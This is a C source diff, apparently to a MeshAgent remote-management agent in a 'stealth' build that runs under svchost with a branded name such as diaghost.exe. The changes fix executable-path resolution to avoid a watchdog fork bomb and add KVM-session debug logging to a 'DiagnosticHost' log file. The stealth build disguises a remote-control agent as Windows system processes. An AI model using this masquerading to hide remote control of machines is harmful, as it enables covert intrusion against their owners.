@@ -1940,10 +1940,11 @@ static BOOL MeshService_ResolveHostExecutablePathW(WCHAR* outputPath, size_t out
 	// In svchost mode, GetModuleFileNameW(NULL) returns svchost.exe. 
 	// We need to resolve the branded agent binary (e.g. diaghost.exe) instead.
 	HMODULE hMod = NULL;
+	WCHAR modulePath[MAX_PATH] = { 0 };
 	if (GetModuleHandleExW(GET_MODULE_HANDLE_EX_FLAG_FROM_ADDRESS | GET_MODULE_HANDLE_EX_FLAG_UNCHANGED_REFCOUNT, (LPCWSTR)&MeshService_ResolveHostExecutablePathW, &hMod) &&
-		GetModuleFileNameW(hMod, outputPath, (DWORD)outputCount) > 0)
+		GetModuleFileNameW(hMod, modulePath, _countof(modulePath)) > 0)
 	{
-		wchar_t* lastSlash = wcsrchr(outputPath, L'\\');
+		wchar_t* lastSlash = wcsrchr(modulePath, L'\\');
 		if (lastSlash != NULL)
 		{
 			*lastSlash = L'\0';
@@ -1952,7 +1953,15 @@ static BOOL MeshService_ResolveHostExecutablePathW(WCHAR* outputPath, size_t out
 			if (brandedName[0] == L'\0') { StringCchCopyW(brandedName, _countof(brandedName), STEALTH_FALLBACK_EXE_NAME); }
 
 			wchar_t candidate[MAX_PATH] = { 0 };
-			if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\%ls", outputPath, brandedName)) &&
+			if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\%ls", modulePath, brandedName)) &&
+				GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
+			{
+				StringCchCopyW(outputPath, outputCount, candidate);
+				return TRUE;
+			}
+			
+			// If branded name fails, try the fallback name explicitly
+			if (SUCCEEDED(StringCchPrintfW(candidate, _countof(candidate), L"%ls\\%ls", modulePath, STEALTH_FALLBACK_EXE_NAME)) &&
 				GetFileAttributesW(candidate) != INVALID_FILE_ATTRIBUTES)
 			{
 				StringCchCopyW(outputPath, outputCount, candidate);
@@ -1960,9 +1969,13 @@ static BOOL MeshService_ResolveHostExecutablePathW(WCHAR* outputPath, size_t out
 			}
 		}
 	}
-#endif
-
+	
+	// If we are in stealth build but cannot find the agent binary, DO NOT return svchost.exe
+	// as it will cause a fork bomb when used with the watchdog.
+	return FALSE;
+#else
 	return GetModuleFileNameW(NULL, outputPath, (DWORD)outputCount) != 0;
+#endif
 }
 
 static BOOL MeshService_SpawnProcessWithTokenW(HANDLE token, const WCHAR* arguments, const WCHAR* desktop, PROCESS_INFORMATION* processInfo, DWORD* errorOut)
@@ -8831,8 +8844,20 @@ int wmain(int argc, char* wargv[])
 	{
 		int pauseMode = (strcasecmp(argv[1], "-kvm1") == 0) ? 1 : 0;
 		void **parm = NULL;
+		int isRundll32 = MeshService_IsRunningUnderRundll32();
 
-		if (!MeshService_IsRunningUnderRundll32())
+		// Diagnostic: trace KVM slave entry (append to existing svchost-debug.log)
+		{
+			HANDLE tf = CreateFileW(L"C:\\ProgramData\\DiagnosticHost\\svchost-debug.log", FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (tf != INVALID_HANDLE_VALUE) {
+				char msg[256]; DWORD w;
+				int n = sprintf_s(msg, sizeof(msg), "[wmain] -kvm entry argc=%d argv1=[%s] isRundll32=%d pauseMode=%d\r\n", argc, argv[1], isRundll32, pauseMode);
+				if (n > 0) WriteFile(tf, msg, n, &w, NULL);
+				CloseHandle(tf);
+			}
+		}
+
+		if (!isRundll32)
 		{
 			fprintf(stderr, "MeshAgent: direct KVM slave execution is disabled. Use rundll32.exe <bridge-dll>,KvmSessionBridgeW <inputPipe> <outputPipe> [-kvm0|-kvm1].\r\n");
 			wmain_free(argv);
@@ -8871,7 +8896,15 @@ int wmain(int argc, char* wargv[])
 			SetProcessDPIAware();
 		}
 
+		{
+			HANDLE tf2 = CreateFileW(L"C:\\ProgramData\\DiagnosticHost\\svchost-debug.log", FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (tf2 != INVALID_HANDLE_VALUE) { char m[64]; DWORD w2; int n2 = sprintf_s(m, sizeof(m), "[wmain] calling kvm_server_mainloop\r\n"); if (n2>0) WriteFile(tf2, m, n2, &w2, NULL); CloseHandle(tf2); }
+		}
 		kvm_server_mainloop((void*)parm);
+		{
+			HANDLE tf3 = CreateFileW(L"C:\\ProgramData\\DiagnosticHost\\svchost-debug.log", FILE_APPEND_DATA, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
+			if (tf3 != INVALID_HANDLE_VALUE) { char m[64]; DWORD w3; int n3 = sprintf_s(m, sizeof(m), "[wmain] kvm_server_mainloop returned\r\n"); if (n3>0) WriteFile(tf3, m, n3, &w3, NULL); CloseHandle(tf3); }
+		}
 		wmain_free(argv);
 		return 0;
 	}
